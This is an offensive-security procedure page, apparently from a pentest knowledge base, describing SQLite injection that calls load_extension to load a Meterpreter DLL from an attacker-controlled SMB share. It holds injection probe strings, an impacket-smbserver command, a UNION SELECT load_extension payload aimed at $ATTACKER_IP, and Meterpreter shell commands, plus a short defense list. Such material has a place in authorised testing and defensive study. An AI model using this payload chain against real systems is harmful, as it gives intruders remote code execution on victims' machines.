---
type: procedure
description: >-
  Exploit a SQLite injection vulnerability to load a malicious DLL via the
  load_extension function, achieving remote command execution on the target
  system.
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.174328+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Exploitation-for-Client-Execution|T1203 - Exploitation for
    Client Execution]]
sub_techniques: []
tags:
  - '[[tags/SQLite-Injection]]'
  - '[[tags/Remote-Command-Execution]]'
commands:
  - '[[commands/impacket-smbserver-create-share]]'
tools: []
platforms:
  - Windows
  - Web
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# SQLite-Injection-Remote-Command-Execution-via-Load-Extension

## Summary

This procedure exploits a SQLite injection vulnerability in an application to load a malicious Meterpreter DLL using the SQLite `load_extension` function, enabling remote command execution on the target system. It targets applications where SQLite is used without proper input sanitization and where the `load_extension` pragma is enabled, allowing attackers to load external libraries from a remote SMB share.

## Description

SQLite is a lightweight database engine commonly embedded in web, mobile, and desktop applications. If an application constructs SQLite queries using unsanitized user input, attackers can inject malicious SQL payloads. This procedure focuses on using the `load_extension` function, which loads SQLite extensions (DLLs on Windows) from a specified path. By injecting a payload that references a remote SMB share hosting a Meterpreter DLL, the attacker can execute arbitrary code upon query processing. This technique is effective against vulnerable applications running on Windows, where DLL loading leads to shellcode execution. The attack assumes the application has network access to the attacker's SMB share and that `load_extension` is not disabled via PRAGMA. Success results in a Meterpreter session for further post-exploitation.

## Requirements

1. Access to a vulnerable application endpoint that accepts user input for SQLite queries (e.g., search forms, API parameters).
2. Knowledge of the SQLite query structure, including the number of columns in the original SELECT statement to match for UNION injection.
3. A pre-built Meterpreter DLL (generated via Metasploit's `msfvenom` for the target architecture).
4. Attacker machine with network reachability to the target (for SMB share access).
5. Tools for SQL injection testing, such as a proxy (e.g., Burp Suite) or automated scanner.

## Defense

- Disable the `load_extension` function in SQLite by setting `PRAGMA load_extension=OFF;` or compiling SQLite without extension support.
- Implement strict input validation and parameterized queries to prevent SQL injection.
- Run the application with least privilege, isolating it from network shares and limiting DLL loading.
- Monitor for anomalous SMB connections from application servers and unexpected DLL loads in process memory.
- Use web application firewalls (WAFs) to detect SQL injection patterns, including `load_extension` keywords.

## Objectives

1. Identify and confirm a SQLite injection point in the target application.
2. Host the malicious DLL on an SMB share accessible by the target.
3. Inject the payload to load the DLL and establish a Meterpreter session.
4. Achieve remote command execution for persistence or lateral movement.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Determine a user input field that influences a SQLite query, such as a search parameter in a web form. Test for injection by appending quotes or boolean conditions to observe errors or behavior changes.

**Instructions**: Use a proxy tool to intercept requests and modify inputs. For example, append `' OR 1=1 --` to the parameter and check for dumped database contents or errors indicating SQLite usage.

**Expected Output**: Database error messages (e.g., "SQL logic error") or unexpected data leakage confirming injection.

**Success Indicators**:
- Application returns results for tautological conditions (e.g., all records).
- SQLite-specific errors appear in responses.

### Step 2: Determine Query Structure

**Context**: To craft a UNION-based injection, match the number of columns in the original query. Use `ORDER BY` clauses to probe the column count.

**Instructions**: Incrementally test `ORDER BY N --` where N starts from 1. When the query fails (e.g., "ORDER BY clause should come after UNION" or no results), N-1 is the column count. Then, use `UNION SELECT NULL, NULL, ...` (matching columns) to confirm.

**Expected Output**: Successful response when column count matches, or error when exceeded.

**Success Indicators**:
- Query executes without error for the correct column count.
- NULL values appear in response if injectable.

### Step 3: Set Up SMB Share for DLL Hosting

**Context**: Create an SMB share on the attacker machine to host the Meterpreter DLL, allowing the target to load it remotely.

**Command** ([[commands/impacket-smbserver-create-share]]):
```bash
impacket-smbserver evilshare /path/to/share -smb2support
```

**Instructions**: Place the Meterpreter DLL (e.g., `meterpreter.dll`) in the share directory. Ensure the share name and path match the payload (e.g., `\\attacker_ip\evilshare\meterpreter.dll`). Start the server and note the IP for the payload.

**Expected Output**: Server logs showing SMB share active and ready for connections.

**Success Indicators**:
- No errors starting the server.
- Target can resolve the attacker's IP (test connectivity if possible).

### Step 4: Craft and Inject the Payload

**Context**: Use the identified column count to inject the `load_extension` call via UNION SELECT, referencing the remote DLL. This executes when the query processes, loading the DLL's entry point.

**Code** ([[codes/SQLite-Union-Select-Load-Extension-Payload]]):
```sql
UNION SELECT 1,load_extension('\\$ATTACKER_IP\evilshare\meterpreter.dll','DllMain');--
```

**Instructions**: Replace `$ATTACKER_IP` with your machine's IP. Append the payload to the vulnerable parameter, ensuring it aligns with the column structure (e.g., if 2 columns, `UNION SELECT 1,load_extension(...)`). Submit via the application interface or proxy. Monitor your Meterpreter listener (e.g., `msfconsole` with `multi/handler`).

**Expected Output**: Application response may show normal results or subtle errors, but a Meterpreter session connects back if successful.

**Success Indicators**:
- Meterpreter session established in listener.
- No immediate application crash (DLL loads silently).

### Step 5: Verify and Interact with the Session

**Context**: Confirm RCE by executing basic commands in the Meterpreter shell to gather system information.

**Instructions**: In the Meterpreter console, run `sysinfo`, `getuid`, and `shell` to spawn a system shell. Use commands like `whoami` or `ipconfig` to validate access.

**Expected Output**: System details, current user, and interactive shell prompt.

**Success Indicators**:
- Commands execute without errors.
- Access to target filesystem or processes confirmed.
